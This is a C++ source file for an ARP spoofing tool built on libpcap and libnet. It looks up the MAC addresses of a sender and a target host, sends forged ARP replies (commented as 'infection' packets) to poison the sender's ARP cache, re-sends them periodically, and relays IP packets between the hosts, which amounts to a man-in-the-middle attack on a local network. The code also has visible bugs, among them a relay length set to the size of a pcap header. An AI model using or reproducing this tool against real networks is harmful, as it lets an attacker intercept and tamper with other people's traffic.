#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmac.h"
#include "getip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {

    if (argc < 4 | argc%2 == 1) {
        usage();
        return -1;
    }

    char* Sender_IP = 0;
    char* Target_IP = 0;
    char* dev = argv[1];

    for(int i=2; i<argc; i+=2){
        Sender_IP = argv[i];
        Target_IP = argv[i+1];
    }


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
    }

    //1. Get my IP, MAC Address
    uint32_t ip_addr = 0;
    Ip My_IP_Addr = GetIpAddress(dev, ip_addr);

    uint8_t mac_addr[6];
    GetMacAddress(dev, mac_addr);
    Mac My_Mac_Addr = mac_addr;


    //2. Get Sender MAC_address
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = My_Mac_Addr;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = My_Mac_Addr;
    packet.arp_.sip_ = htonl(My_IP_Addr);
    packet.arp_.tmac_ = Mac(Mac::nullMac());
    packet.arp_.tip_ = htonl(Ip(Sender_IP));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    const u_char* pkt;
    struct pcap_pkthdr* header;
    struct EthHdr* Ethernet;
    struct ArpHdr* Arp;

    struct Mac Sender_Mac_Addr;
    while(true) {
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        Ethernet = (struct EthHdr *)(pkt);
        Arp = (struct ArpHdr *)(pkt + sizeof(EthHdr));
        if (ntohs(Ethernet->type_) == EthHdr::Arp && ntohs(Arp->op_) == ArpHdr::Reply && ntohl(Arp->sip_) == Ip(Sender_IP)){
            Sender_Mac_Addr = Arp->smac_;
            break;
        }
    }


    //3. Get Target MAC_address
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = My_Mac_Addr;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = My_Mac_Addr;
    packet.arp_.sip_ = htonl(My_IP_Addr);
    packet.arp_.tmac_ = Mac(Mac::nullMac());
    packet.arp_.tip_ = htonl(Ip(Target_IP));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    struct Mac Target_Mac_Addr;
    while(true) {
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        Ethernet = (struct EthHdr *)(pkt);
        Arp = (struct ArpHdr *)(pkt + sizeof(EthHdr));
        if (Ethernet->type_ == htons(EthHdr::Arp) && Arp->op_ == htons(ArpHdr::Reply) && ntohl(Arp->sip_) == Ip(Target_IP)){
            Target_Mac_Addr = Arp->smac_;
            break;
        }
    }


   //4. Send ARP Infection Packet to Sender
    packet.eth_.dmac_ = Sender_Mac_Addr;
    packet.eth_.smac_ = My_Mac_Addr;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = My_Mac_Addr;
    packet.arp_.sip_ = htonl(Ip(Target_IP));
    packet.arp_.tmac_ = Sender_Mac_Addr;
    packet.arp_.tip_ = htonl(Ip(Sender_IP));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    while(true) {
        const u_char* received_pkt;
        struct pcap_pkthdr* header;
        struct EthHdr* ARPpkt_eth;
        struct ArpHdr* ARPpkt_ip;
        struct libnet_ethernet_hdr* IPpkt_eth;
        struct libnet_ipv4_hdr* IPpkt_ip;
        uint k = 0;

        res = pcap_next_ex(handle, &header, &received_pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ARPpkt_eth = (struct EthHdr *)received_pkt;
        ARPpkt_ip = (struct ArpHdr *)(received_pkt + sizeof(struct EthHdr));
        IPpkt_eth = (struct libnet_ethernet_hdr *)(received_pkt);
        IPpkt_ip = (struct libnet_ipv4_hdr *)(received_pkt + sizeof(struct libnet_ethernet_hdr));

        // Send ARP Packet to Sender
        if(ntohs(ARPpkt_eth->type_) == EthHdr::Arp && ntohs(ARPpkt_ip->op_) == ArpHdr::Request
                && ntohl(ARPpkt_ip->sip_) == Ip(Sender_IP) && ntohl(ARPpkt_ip->tip_) == Ip(Target_IP)) {
            k = 1;
        }

        // Relay Packet
        if(ntohs(IPpkt_eth -> ether_type) == (EthHdr::Ip4) && Mac(IPpkt_eth -> ether_shost) == Sender_Mac_Addr) {
            k = 2;
        }

        // Send IP Packet to Sender
        if(ntohs(IPpkt_eth -> ether_type) == (EthHdr::Ip4) && Mac(IPpkt_eth -> ether_shost) == Target_Mac_Addr
                && inet_ntoa(IPpkt_ip -> ip_dst) == Sender_IP) {
            k = 3;
        }


        switch(k) {
            case 1: {   // Send ARP Infection Packet to sender
                EthArpPacket Reply_packet;
                Reply_packet.eth_.dmac_ = Sender_Mac_Addr;
                Reply_packet.eth_.smac_ = My_Mac_Addr;
                Reply_packet.eth_.type_ = htons(EthHdr::Arp);
                Reply_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                Reply_packet.arp_.pro_ = htons(EthHdr::Ip4);
                Reply_packet.arp_.hln_ = Mac::SIZE;
                Reply_packet.arp_.pln_ = Ip::SIZE;
                Reply_packet.arp_.op_ = htons(ArpHdr::Reply);
                Reply_packet.arp_.smac_ = My_Mac_Addr;
                Reply_packet.arp_.sip_ = htonl(Ip(Target_IP));
                Reply_packet.arp_.tmac_ = Sender_Mac_Addr;
                Reply_packet.arp_.tip_ = htonl(Ip(Sender_IP));

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Reply_packet), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                break;
            }

            case 2: {   //  Send Relay Packet to Target
                Mac(IPpkt_eth -> ether_dhost) = Target_Mac_Addr;
                Mac(IPpkt_eth -> ether_shost) = My_Mac_Addr;
                res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                break;
            }

            case 3: {   //  Send Packet to Target
                Mac(IPpkt_eth -> ether_dhost) = Sender_Mac_Addr;
                Mac(IPpkt_eth -> ether_shost) = My_Mac_Addr;
                res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                break;
            }

            default: {  // Send Request Arp Infection Packet
                EthArpPacket Request_packet;
                sleep(1);
                Request_packet.eth_.dmac_ = Sender_Mac_Addr;
                Request_packet.eth_.smac_ = My_Mac_Addr;
                Request_packet.eth_.type_ = htons(EthHdr::Arp);
                Request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                Request_packet.arp_.pro_ = htons(EthHdr::Ip4);
                Request_packet.arp_.hln_ = Mac::SIZE;
                Request_packet.arp_.pln_ = Ip::SIZE;
                Request_packet.arp_.op_ = htons(ArpHdr::Request);
                Request_packet.arp_.smac_ = My_Mac_Addr;
                Request_packet.arp_.sip_ = htonl(Ip(Target_IP));
                Request_packet.arp_.tmac_ = Sender_Mac_Addr;
                Request_packet.arp_.tip_ = htonl(Ip(Sender_IP));

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Request_packet), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                break;
            }
        }
    }

    pcap_close(handle);

}
